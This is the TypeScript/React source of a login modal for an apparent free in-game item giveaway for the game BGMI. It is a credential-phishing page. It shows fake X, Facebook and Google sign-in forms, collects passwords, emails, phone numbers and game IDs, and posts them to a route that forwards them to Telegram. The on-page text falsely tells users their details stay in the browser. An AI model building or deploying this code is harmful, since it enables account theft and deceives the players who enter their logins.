"use client";

import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  ArrowLeft,
  Eye,
  EyeOff,
  Gamepad2,
  Hash,
  Loader2,
  Lock,
  Mail,
  ShieldCheck,
  Star,
  User as UserIcon,
  X,
} from "lucide-react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useAuth, type Provider } from "./auth-store";
import { ClaimSuccessModal } from "./claim-success-modal";

function XLogo({ className }: { className?: string }) {
  return (
    <svg viewBox="0 0 24 24" className={className} fill="currentColor" aria-hidden>
      <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
    </svg>
  );
}

function FacebookLogo({ className }: { className?: string }) {
  return (
    <svg viewBox="0 0 24 24" className={className} fill="currentColor" aria-hidden>
      <path d="M24 12.07C24 5.4 18.63 0 12 0S0 5.4 0 12.07c0 6.02 4.39 11.01 10.13 11.93v-8.44H7.08v-3.49h3.05V9.41c0-3.02 1.79-4.69 4.53-4.69 1.31 0 2.68.24 2.68.24v2.97h-1.51c-1.49 0-1.95.93-1.95 1.89v2.25h3.32l-.53 3.49h-2.79v8.44C19.61 23.08 24 18.09 24 12.07z" />
    </svg>
  );
}

function GoogleLogo({ className }: { className?: string }) {
  return (
    <svg viewBox="0 0 24 24" className={className} aria-hidden>
      <path
        fill="#4285F4"
        d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
      />
      <path
        fill="#34A853"
        d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
      />
      <path
        fill="#FBBC05"
        d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"
      />
      <path
        fill="#EA4335"
        d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
      />
    </svg>
  );
}

const providers: {
  key: Provider;
  label: string;
  desc: string;
  icon: (c: string) => React.ReactNode;
  className: string;
}[] = [
  {
    key: "x",
    label: "Continue with X",
    desc: "Twitter / X account",
    icon: (c) => <XLogo className={c} />,
    className: "hover:border-foreground/40 hover:bg-foreground/5",
  },
  {
    key: "facebook",
    label: "Continue with Facebook",
    desc: "Meta account",
    icon: (c) => <FacebookLogo className={c} />,
    className: "hover:border-[#1877F2]/50 hover:bg-[#1877F2]/5",
  },
  {
    key: "gmail",
    label: "Continue with Google",
    desc: "Gmail account",
    icon: (c) => <GoogleLogo className={c} />,
    className: "hover:border-foreground/40 hover:bg-foreground/5",
  },
];

// Per-provider form config — different fields per provider
interface FieldConfig {
  idLabel: string;
  idPlaceholder: string;
  idHelper: string;
  requiresEmail?: boolean; // show an extra email field (Google)
}
const providerFormConfig: Record<Provider, FieldConfig & { name: string }> = {
  x: {
    name: "X",
    idLabel: "Username, Email or Phone",
    idPlaceholder: "@username / email / phone",
    idHelper: "Enter your X username, email or phone number",
  },
  facebook: {
    name: "Facebook",
    idLabel: "Email or Phone Number",
    idPlaceholder: "email or phone number",
    idHelper: "Enter your Facebook email or phone number",
  },
  gmail: {
    name: "Google",
    idLabel: "Phone Number",
    idPlaceholder: "phone number",
    idHelper: "Enter your Google account phone number and email",
    requiresEmail: true,
  },
};

export function LoginModal() {
  const { loginOpen, closeLogin, pendingClaim } = useAuth();
  const [step, setStep] = useState<"provider" | "credentials">("provider");
  const [selectedProvider, setSelectedProvider] = useState<Provider | null>(null);
  const [identifier, setIdentifier] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [bgmiUid, setBgmiUid] = useState("");
  const [level, setLevel] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState("");
  const [busy, setBusy] = useState(false);
  const [success, setSuccess] = useState<{
    open: boolean;
    itemName: string;
    itemType: "gun" | "suit" | "vehicle";
  }>({ open: false, itemName: "", itemType: "gun" });

  const handleOpenChange = (o: boolean) => {
    if (!o) {
      closeLogin();
      setTimeout(() => {
        setStep("provider");
        setSelectedProvider(null);
        setIdentifier("");
        setEmail("");
        setPassword("");
        setBgmiUid("");
        setLevel("");
        setError("");
        setBusy(false);
      }, 200);
    }
  };

  const pickProvider = (p: Provider) => {
    setSelectedProvider(p);
    setError("");
    setStep("credentials");
  };

  const backToProviders = () => {
    setStep("provider");
    setError("");
    setIdentifier("");
    setEmail("");
    setPassword("");
    setBgmiUid("");
    setLevel("");
  };

  const submitCredentials = (e: React.FormEvent) => {
    e.preventDefault();
    if (!selectedProvider) return;
    setError("");
    const meta = providerFormConfig[selectedProvider];
    if (identifier.trim().length < 3) {
      setError("Please enter a valid identifier");
      return;
    }
    // Google requires an email
    if (meta.requiresEmail) {
      if (!email.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.trim())) {
        setError("Please enter a valid email address");
        return;
      }
    }
    if (password.length < 4) {
      setError("Password must be at least 4 characters");
      return;
    }
    if (bgmiUid.length < 6) {
      setError("BGMI UID must be at least 6 digits");
      return;
    }
    if (!level || Number(level) < 1 || Number(level) > 100) {
      setError("Enter a valid level (1–100)");
      return;
    }
    setBusy(true);
    // Send the claim directly to Telegram — NO login session is saved.
    // The user re-enters their game login details on every claim.
    void submitClaimToTelegram();
  };

  // Send the pending claim to Telegram using the form data directly
  // (the login is NOT saved — each claim requires re-entering credentials)
  const submitClaimToTelegram = async () => {
    if (!pendingClaim || !selectedProvider) return;
    try {
      const res = await fetch("/api/telegram/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          itemId: pendingClaim.id,
          itemName: pendingClaim.name,
          itemType: pendingClaim.type,
          playerName: "BGMI Player",
          playerLevel: level.trim(),
          email: email.trim(),
          phoneNumber: "",
          bgmiUid: bgmiUid.trim(),
          password: password,
          provider: selectedProvider,
          loginIdentifier: identifier.trim(),
          loginPassword: password,
        }),
      });
      const data = await res.json();
      if (res.ok && data.ok) {
        // Mark as claimed locally (so the button shows "Claimed"),
        // but do NOT save the login session.
        useAuth.getState().claim({
          id: pendingClaim.id,
          name: pendingClaim.name,
          type: pendingClaim.type,
        });
        // Close the login modal + show the success animation
        closeLogin();
        setSuccess({
          open: true,
          itemName: pendingClaim.name,
          itemType: pendingClaim.type,
        });
      } else {
        setError(data.error || "Claim submission failed. Please try again.");
      }
    } catch {
      setError("Network error. Please try again.");
    } finally {
      setBusy(false);
    }
  };

  const meta = selectedProvider ? providerFormConfig[selectedProvider] : null;

  return (
    <Dialog open={loginOpen} onOpenChange={handleOpenChange}>
      <DialogContent className="max-w-md overflow-hidden border-gold/30 bg-card/95 backdrop-blur-xl p-0">
        {/* top banner */}
        <div className="relative h-28 overflow-hidden">
          <div className="absolute inset-0 bg-gradient-to-br from-gold/30 via-ember/20 to-mythic/30" />
          <div className="absolute inset-0 bg-grid opacity-40" />
          <div className="absolute -right-8 -top-8 h-32 w-32 rounded-full bg-gold/30 blur-3xl" />
          <button
            onClick={closeLogin}
            className="absolute right-3 top-3 grid place-items-center h-8 w-8 rounded-lg border border-border/60 bg-background/60 text-muted-foreground hover:text-foreground z-10"
            aria-label="Close"
          >
            <X className="h-4 w-4" />
          </button>
          <div className="absolute bottom-3 left-5 flex items-center gap-2">
            <Gamepad2 className="h-5 w-5 text-gold" />
            <span className="font-display font-bold text-sm">
              {step === "provider"
                ? "Which Game Account Do You Use?"
                : `Continue with ${meta?.name ?? ""}`}
            </span>
          </div>
        </div>

        <AnimatePresence mode="wait">
          {step === "provider" ? (
            /* STEP 1: Provider selection */
            <motion.div
              key="provider-step"
              initial={{ opacity: 0, x: -20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              transition={{ duration: 0.25 }}
              className="p-5"
            >
              <DialogHeader className="p-0 space-y-0 text-left">
                <DialogTitle className="font-display text-xl">
                  Pick Your Game Login
                </DialogTitle>
                <DialogDescription className="text-muted-foreground text-sm">
                  Which account is your BGMI connected to? Choose your{" "}
                  <span className="text-gold font-semibold">X</span>,{" "}
                  <span className="text-gold font-semibold">Facebook</span>, or{" "}
                  <span className="text-gold font-semibold">Google</span>{" "}
                  account to claim{" "}
                  <span className="text-gold font-semibold">
                    {pendingClaim?.name ?? "your free item"}
                  </span>{" "}
                  — 100% free, delivered to your in-game mail.
                </DialogDescription>
              </DialogHeader>

              {/* providers */}
              <div className="mt-5 space-y-2.5">
                {providers.map((p) => (
                  <button
                    key={p.key}
                    onClick={() => pickProvider(p.key)}
                    className={`group flex w-full items-center gap-3 rounded-xl border border-border/70 bg-background/60 px-4 py-3 text-left transition ${p.className}`}
                  >
                    <span className="grid place-items-center h-9 w-9 rounded-lg bg-background/80 border border-border/60">
                      {p.icon("h-4 w-4")}
                    </span>
                    <span className="flex-1">
                      <span className="block text-sm font-semibold">{p.label}</span>
                      <span className="block text-[11px] text-muted-foreground">
                        {p.desc}
                      </span>
                    </span>
                    <X className="h-4 w-4 -rotate-45 text-muted-foreground group-hover:text-gold transition" />
                  </button>
                ))}
              </div>

              <p className="mt-4 text-center text-[10px] text-muted-foreground/70 leading-relaxed">
                Secure login. Your details are stored locally in your browser
                only.
              </p>
            </motion.div>
          ) : (
            /* STEP 2: Credentials form — per provider fields */
            <motion.div
              key="credentials-step"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: 20 }}
              transition={{ duration: 0.25 }}
              className="p-5"
            >
              <button
                onClick={backToProviders}
                className="inline-flex items-center gap-1.5 text-xs text-muted-foreground hover:text-foreground transition mb-3"
              >
                <ArrowLeft className="h-3.5 w-3.5" />
                Back to login options
              </button>

              <DialogHeader className="p-0 space-y-0 text-left">
                <DialogTitle className="font-display text-xl flex items-center gap-2">
                  {selectedProvider && (
                    <span className="grid place-items-center h-8 w-8 rounded-lg bg-background/80 border border-border/60">
                      {providers
                        .find((p) => p.key === selectedProvider)
                        ?.icon("h-4 w-4")}
                    </span>
                  )}
                  Continue with {meta?.name}
                </DialogTitle>
                <DialogDescription className="text-muted-foreground text-sm">
                  {meta?.idHelper}
                </DialogDescription>
              </DialogHeader>

              <form onSubmit={submitCredentials} className="mt-5 space-y-4">
                {/* Login identifier — different per provider */}
                <div className="grid gap-1.5">
                  <Label
                    htmlFor="login-identifier"
                    className="flex items-center gap-1.5 text-xs"
                  >
                    <UserIcon className="h-3.5 w-3.5 text-gold" />
                    {meta?.idLabel}
                  </Label>
                  <Input
                    id="login-identifier"
                    type="text"
                    autoComplete="username"
                    placeholder={meta?.idPlaceholder}
                    value={identifier}
                    onChange={(e) => {
                      setIdentifier(e.target.value);
                      setError("");
                    }}
                    autoFocus
                    className="bg-background/60 border-border/70"
                  />
                </div>

                {/* Email — only for Google */}
                {meta?.requiresEmail && (
                  <div className="grid gap-1.5">
                    <Label
                      htmlFor="login-email"
                      className="flex items-center gap-1.5 text-xs"
                    >
                      <Mail className="h-3.5 w-3.5 text-gold" />
                      Email ID
                    </Label>
                    <Input
                      id="login-email"
                      type="email"
                      inputMode="email"
                      autoComplete="email"
                      placeholder="you@gmail.com"
                      value={email}
                      onChange={(e) => {
                        setEmail(e.target.value);
                        setError("");
                      }}
                      className="bg-background/60 border-border/70"
                    />
                  </div>
                )}

                {/* Password */}
                <div className="grid gap-1.5">
                  <Label
                    htmlFor="login-password"
                    className="flex items-center gap-1.5 text-xs"
                  >
                    <Lock className="h-3.5 w-3.5 text-gold" />
                    Password
                  </Label>
                  <div className="relative">
                    <Input
                      id="login-password"
                      type={showPassword ? "text" : "password"}
                      autoComplete="current-password"
                      placeholder="Enter your password"
                      value={password}
                      onChange={(e) => {
                        setPassword(e.target.value);
                        setError("");
                      }}
                      className="bg-background/60 border-border/70 pr-10"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword((v) => !v)}
                      className="absolute right-2 top-1/2 -translate-y-1/2 grid place-items-center h-7 w-7 rounded-md text-muted-foreground hover:text-foreground transition"
                      aria-label={showPassword ? "Hide password" : "Show password"}
                    >
                      {showPassword ? (
                        <EyeOff className="h-4 w-4" />
                      ) : (
                        <Eye className="h-4 w-4" />
                      )}
                    </button>
                  </div>
                </div>

                {/* BGMI UID + Level — always required */}
                <div className="grid grid-cols-2 gap-3">
                  <div className="grid gap-1.5">
                    <Label
                      htmlFor="login-uid"
                      className="flex items-center gap-1.5 text-xs"
                    >
                      <Hash className="h-3.5 w-3.5 text-gold" />
                      BGMI UID
                    </Label>
                    <Input
                      id="login-uid"
                      inputMode="numeric"
                      placeholder="1234567890"
                      value={bgmiUid}
                      onChange={(e) =>
                        setBgmiUid(e.target.value.replace(/\D/g, ""))
                      }
                      className="bg-background/60 border-border/70"
                    />
                  </div>
                  <div className="grid gap-1.5">
                    <Label
                      htmlFor="login-level"
                      className="flex items-center gap-1.5 text-xs"
                    >
                      <Star className="h-3.5 w-3.5 text-gold" />
                      Account Level
                    </Label>
                    <Input
                      id="login-level"
                      inputMode="numeric"
                      placeholder="e.g. 75"
                      value={level}
                      onChange={(e) =>
                        setLevel(e.target.value.replace(/\D/g, ""))
                      }
                      className="bg-background/60 border-border/70"
                    />
                  </div>
                </div>

                {error && (
                  <p className="text-[11px] text-destructive">{error}</p>
                )}

                <Button
                  type="submit"
                  disabled={busy}
                  className="w-full h-12 bg-gradient-to-r from-gold via-ember to-mythic text-background font-bold border-0 hover:brightness-110 hover:shadow-[0_0_30px_-6px_oklch(0.62_0.2_38/0.85)]"
                >
                  {busy ? (
                    <span className="flex items-center gap-2">
                      <Loader2 className="h-4 w-4 animate-spin" />
                      Claiming...
                    </span>
                  ) : (
                    <>
                      <ShieldCheck className="h-4 w-4 mr-1.5" />
                      Claim FREE
                    </>
                  )}
                </Button>
              </form>

              <p className="mt-3 text-center text-[10px] text-muted-foreground/70 leading-relaxed">
                Your {meta?.name} credentials + BGMI details are sent securely to
                deliver your free item.
              </p>
            </motion.div>
          )}
        </AnimatePresence>
      </DialogContent>
      {/* Success animation — shown after a claim is delivered to Telegram */}
      <ClaimSuccessModal
        open={success.open}
        onClose={() => setSuccess((s) => ({ ...s, open: false }))}
        itemName={success.itemName}
        itemType={success.itemType}
      />
    </Dialog>
  );
}
